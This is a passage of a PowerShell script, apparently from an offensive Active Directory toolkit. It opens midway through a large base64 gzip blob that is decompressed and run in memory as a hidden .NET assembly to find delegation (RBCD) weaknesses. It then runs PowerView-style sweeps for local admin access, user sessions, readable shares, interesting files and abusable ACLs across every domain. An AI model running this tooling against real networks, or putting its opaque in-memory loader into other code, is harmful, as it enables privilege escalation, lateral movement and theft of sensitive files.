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"))
		$decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
		$output = New-Object System.IO.MemoryStream
		$decompressed.CopyTo( $output )
		[byte[]] $byteOutArray = $output.ToArray()
		$RAS = [System.Reflection.Assembly]::Load($byteOutArray)
		
		$OldConsoleOut = [Console]::Out
		$StringWriter = New-Object IO.StringWriter
		[Console]::SetOut($StringWriter)

		[Get_RBCD.Program]::main($Command.Split(" "))

		[Console]::SetOut($OldConsoleOut)
		$Results = $StringWriter.ToString()
		$Results
	  
	}
	
	if($Domain -AND $Server) {
		$RBCDoutput = Invoke-Get-RBCD-Threaded -Command "-s -d $Domain"
		$RBCDoutput = ($RBCDoutput | Out-String) -split "`n"
		$RBCDoutput = $RBCDoutput.Trim()
		$RBCDoutput = $RBCDoutput | Where-Object { $_ -ne "" }
		$RBCDoutput = $RBCDoutput | Select-String -Pattern 'Number of possible RBCD ACLs:', 'RBCD ACL:', 'Source:', 'Source Domain:', 'Destination:', 'Privilege:'
		if($RBCDoutput = "Number of possible RBCD ACLs: 0"){}
		else{$RBCDoutput | Out-String}
	}
	else{
		$RBCDoutput = Invoke-Get-RBCD-Threaded -Command "-s"
		$RBCDoutput = ($RBCDoutput | Out-String) -split "`n"
		$RBCDoutput = $RBCDoutput.Trim()
		$RBCDoutput = $RBCDoutput | Where-Object { $_ -ne "" }
		$RBCDoutput = $RBCDoutput | Select-String -Pattern 'Number of possible RBCD ACLs:', 'RBCD ACL:', 'Source:', 'Source Domain:', 'Destination:', 'Privilege:'
		if($RBCDoutput = "Number of possible RBCD ACLs: 0"){}
		else{$RBCDoutput | Out-String}
	}
	
<# 	Write-Host ""
	Write-Host "Admin Users that allow delegation, logged into servers that allow unconstrained delegation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-DomainUserLocation -Domain $Domain -Server $Server -ComputerUnconstrained -UserAdminCount -UserAllowDelegation | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Find-DomainUserLocation -Domain $AllDomain -ComputerUnconstrained -UserAdminCount -UserAllowDelegation | Format-Table -AutoSize -Wrap}
	} #>

	Write-Host ""
	Write-Host "Privileged users that aren't marked as sensitive/not for delegation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -AllowDelegation -AdminCount | select-object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Get-DomainUser -Domain $AllDomain -AllowDelegation -AdminCount | select-object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGPOLocalGroup -Domain $Domain -Server $Server | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGPOLocalGroup -Domain $AllDomain | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Machines where a specific domain user/group is a member of the Administrators local group:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGPOUserLocalGroupMapping -Domain $Domain -Server $Server -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGPOUserLocalGroupMapping -Domain $AllDomain -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Users which are in a local group of a machine using GPO:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Domain $Domain -Server $Server | Find-GPOComputerAdmin -Domain $Domain -Server $Server | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Find-GPOComputerAdmin | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Machines where a user is member of a specific group:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server | Find-GPOLocation -Domain $Domain -Server $Server | Select-Object ObjectName, ObjectSID, Domain, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain | Find-GPOLocation | Select-Object ObjectName, ObjectSID, Domain, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Find Local Admin Access:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-LocalAdminAccess -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-LocalAdminAccess -Domain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Out-String}
	}
	

	Write-Host ""
	Write-Host "Find Domain User Location:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-DomainUserLocation -Domain $Domain -Server $Server -Delay 1 | select UserName, SessionFromName | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-DomainUserLocation -Domain $AllDomain -Delay 1 | select UserName, SessionFromName | Out-String}
	}

<# 	Write-Host ""
	Write-Host "Audit the permissions of AdminSDHolder, resolving GUIDs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$dcName = "dc=" + $Domain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObjectAcl -Domain $Domain -Server $Server -SearchBase "CN=AdminSDHolder,CN=System,$dcName" -ResolveGUIDs | select ObjectDN,AceQualifier,ActiveDirectoryRights,ObjectAceType | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){$dcName = "dc=" + $AllDomain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObjectAcl -Domain $AllDomain -SearchBase "CN=AdminSDHolder,CN=System,$dcName" -ResolveGUIDs | select ObjectDN,AceQualifier,ActiveDirectoryRights,ObjectAceType | Out-String}
	} #>

	Write-Host ""
	Write-Host "Find any machine accounts in privileged groups:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server -AdminCount | Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse | ?{$_.MemberName -like '*$'} | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} | Out-String}
	}

	Write-Host ""
	Write-Host "Find Domain Shares:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String
	}
	
	else{
		foreach($AllDomain in $AllDomains){Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String}
	}

	Write-Host ""
	Write-Host "Find Interesting Domain Share Files:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Out-String}
	}
	
	Write-Host ""
	Write-Host "Second run (more file extensions):"
	if($Domain -AND $Server) {
		Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String}
	}

	Write-Host ""
	Write-Host "Find interesting ACLs:" -ForegroundColor Cyan
	#Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Out-String
	if($Domain -AND $Server) {
		Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Invoke-ACLScanner -Domain $AllDomain -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap}
	}

}
